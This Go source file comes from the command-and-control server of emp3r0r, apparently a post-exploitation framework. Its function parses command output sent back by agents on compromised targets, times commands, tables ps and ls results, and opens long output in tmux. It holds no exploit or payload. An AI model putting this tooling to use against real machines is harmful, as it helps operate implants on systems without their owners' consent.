package cc

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/olekukonko/tablewriter"
)

// CmdResults receive response from agent and cache them
var CmdResults = make(map[string]string)

// mutex
var CmdResultsMutex = &sync.Mutex{}

// processAgentData deal with data from agent side
func processAgentData(data *emp3r0r_data.MsgTunData) {
	payloadSplit := strings.Split(data.Payload, emp3r0r_data.OpSep)
	op := payloadSplit[0]

	target := GetTargetFromTag(data.Tag)
	contrlIf := Targets[target]
	if target == nil || contrlIf == nil {
		CliPrintError("Target %s cannot be found, however, it left a message saying:\n%v",
			data.Tag, payloadSplit)
		return
	}

	switch op {

	// cmd output from agent
	case "cmd":
		cmd := payloadSplit[1]
		out := strings.Join(payloadSplit[2:len(payloadSplit)-1], " ")
		outLines := strings.Split(out, "\n")

		// time spent on this cmd
		cmd_id := payloadSplit[len(payloadSplit)-1]
		start_time, err := time.Parse("2006-01-02 15:04:05.999999999 -0700 MST", CmdTime[cmd+cmd_id])
		if err != nil {
			CliPrintWarning("Parsing timestamp %s: %v", CmdTime[cmd+cmd_id], err)
		} else {
			time_spent := time.Since(start_time)
			CliPrintInfo("Command %s took %s", strconv.Quote(cmd), time_spent)
		}

		// headless mode
		if IsAPIEnabled {
			// send to socket
			var resp APIResponse
			msg := fmt.Sprintf("%s:\n%s", cmd, out)
			resp.Cmd = cmd
			resp.MsgData = []byte(msg)
			resp.Alert = false
			resp.MsgType = CMD
			data, err := json.Marshal(resp)
			if err != nil {
				log.Printf("processAgentData cmd output: %v", err)
				return
			}
			_, err = APIConn.Write([]byte(data))
			if err != nil {
				log.Printf("processAgentData cmd output: %v", err)
			}
		}

		// screenshot command
		if strings.HasPrefix(cmd, "screenshot") {
			go func() {
				err = processScreenshot(out, target)
				if err != nil {
					CliPrintError("%v", err)
				}
			}()
		}

		// ps command
		if strings.HasPrefix(cmd, "#ps") {
			var procs []util.ProcEntry
			err = json.Unmarshal([]byte(out), &procs)
			if err != nil {
				CliPrintError("ps: %v:\n%s", err, out)
				return
			}

			// build table
			tdata := [][]string{}
			tableString := &strings.Builder{}
			table := tablewriter.NewWriter(tableString)
			table.SetHeader([]string{"Name", "PID", "PPID", "User"})
			table.SetBorder(true)
			table.SetRowLine(true)
			table.SetAutoWrapText(true)

			// color
			table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor})

			table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor})

			// fill table
			for _, p := range procs {
				tdata = append(tdata, []string{p.Name, strconv.Itoa(p.PID), strconv.Itoa(p.PPID), p.Token})
			}
			table.AppendBulk(tdata)
			table.Render()
			// CliMsg("Listing processes:\033[0m\n%s", tableString.String())
			// return
			out = tableString.String()
			outLines = strings.Split(out, "\n")
		}

		// ls command
		if strings.HasPrefix(cmd, "ls") {
			var dents []util.Dentry
			err = json.Unmarshal([]byte(out), &dents)
			if err != nil {
				CliPrintError("ls: %v:\n%s", err, out)
				return
			}

			LsDir = nil // clear cache

			// build table
			tdata := [][]string{}
			tableString := &strings.Builder{}
			table := tablewriter.NewWriter(tableString)
			table.SetHeader([]string{"Name", "Type", "Size", "Time", "Permission"})
			table.SetRowLine(true)
			table.SetBorder(true)

			// color
			table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
				tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor})

			table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor},
				tablewriter.Colors{tablewriter.FgBlueColor})

			// fill table
			for _, d := range dents {
				tdata = append(tdata, []string{d.Name, d.Ftype, d.Size, d.Date, d.Permission})
				if d.Ftype == "file" {
					LsDir = append(LsDir, d.Name)
				} else {
					LsDir = append(LsDir, d.Name+"/")
				}
			}
			table.AppendBulk(tdata)
			table.Render()
			// CliMsg("Listing current path:\033[0m\n%s", tableString.String())
			// return
			out = tableString.String()
			outLines = strings.Split(out, "\n")
		}

		// optimize output
		if len(outLines) > 20 {
			t := time.Now()
			logname := fmt.Sprintf("%scmd-%d-%02d-%02dT%02d:%02d:%02d.log",
				Temp,
				t.Year(), t.Month(), t.Day(),
				t.Hour(), t.Minute(), t.Second())

			CliPrintInfo("Output will be displayed in new window")
			err := ioutil.WriteFile(logname, []byte(out), 0600)
			if err != nil {
				CliPrintWarning(err.Error())
			}

			viewCmd := fmt.Sprintf(`less -f -r %s`,
				logname)

			// split window vertically
			if err = TmuxSplit("v", viewCmd); err == nil {
				CliPrintSuccess("View result in new window (press q to quit)")
				return
			}
			CliPrintError("Failed to opent tmux window: %v", err)
		}

		log.Printf("\n[%s] %s:\n%s\n\n", color.CyanString("%d", contrlIf.Index), color.HiMagentaString(cmd), color.HiWhiteString(out))
		// cache this cmd response
		CmdResultsMutex.Lock()
		CmdResults[cmd] = out
		CmdResultsMutex.Unlock()

	default:
	}
}
